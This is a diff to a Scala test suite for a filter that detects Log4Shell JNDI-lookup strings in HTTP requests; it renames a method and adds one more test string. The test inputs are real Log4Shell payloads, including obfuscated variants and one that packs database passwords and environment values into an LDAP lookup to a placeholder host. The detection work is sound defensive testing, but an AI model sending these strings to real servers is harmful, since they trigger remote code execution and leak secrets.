@@ -14,10 +14,11 @@ import play.api.libs.json.{JsArray, JsObject, Json}
 class Log4jShellSpec extends WordSpec with MustMatchers with OptionValues with ScalaFutures with IntegrationPatience {
   "Log4jShellFilter" should {
     "find bad headers" in {
-      Log4jExpressionParser.parseAsExp("'${jndi:ldap://foo.bar/a}").hasJNDI.mustBe(true)
-      Log4jExpressionParser.parseAsExp("hello people ${jndi:ldap://127.0.0.1/a} foo").hasJNDI.mustBe(true)
-      Log4jExpressionParser.parseAsExp("hello people ${${lower:j}ndi:ldap://127.0.0.1/a} foo").hasJNDI.mustBe(true)
-      Log4jExpressionParser.parseAsExp("${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:imageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:containerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}").hasJNDI.mustBe(true)
+      Log4jExpressionParser.parseAsExp("'${jndi:ldap://foo.bar/a}").hasJndi.mustBe(true)
+      Log4jExpressionParser.parseAsExp("${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}").hasJndi.mustBe(true)
+      Log4jExpressionParser.parseAsExp("hello people ${jndi:ldap://127.0.0.1/a} foo").hasJndi.mustBe(true)
+      Log4jExpressionParser.parseAsExp("hello people ${${lower:j}ndi:ldap://127.0.0.1/a} foo").hasJndi.mustBe(true)
+      Log4jExpressionParser.parseAsExp("${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:imageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:containerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}").hasJndi.mustBe(true)
     }
     "find lot of bad headers" in {
       implicit val system = ActorSystem()
@@ -37,11 +38,11 @@ class Log4jShellSpec extends WordSpec with MustMatchers with OptionValues with S
            val method = request.select("method").asOpt[String].getOrElse("--")
            val body = request.select("body").asOpt[String].getOrElse("--")
            val headers = request.select("headers").asOpt[JsObject].getOrElse(Json.obj())
-           val badMethod = Log4jExpressionParser.parseAsExp(method).hasJNDI
-           val badUri = Log4jExpressionParser.parseAsExp(uri).hasJNDI
-           val badBody = Log4jExpressionParser.parseAsExp(body).hasJNDI
+           val badMethod = Log4jExpressionParser.parseAsExp(method).hasJndi
+           val badUri = Log4jExpressionParser.parseAsExp(uri).hasJndi
+           val badBody = Log4jExpressionParser.parseAsExp(body).hasJndi
            val headerz = headers.value.values.map(_.as[String])
-           val badHeaders = headerz.exists(Log4jExpressionParser.parseAsExp(_).hasJNDI)
+           val badHeaders = headerz.exists(Log4jExpressionParser.parseAsExp(_).hasJndi)
            (badBody || badHeaders || badMethod || badUri).mustBe(true)
          }
        }
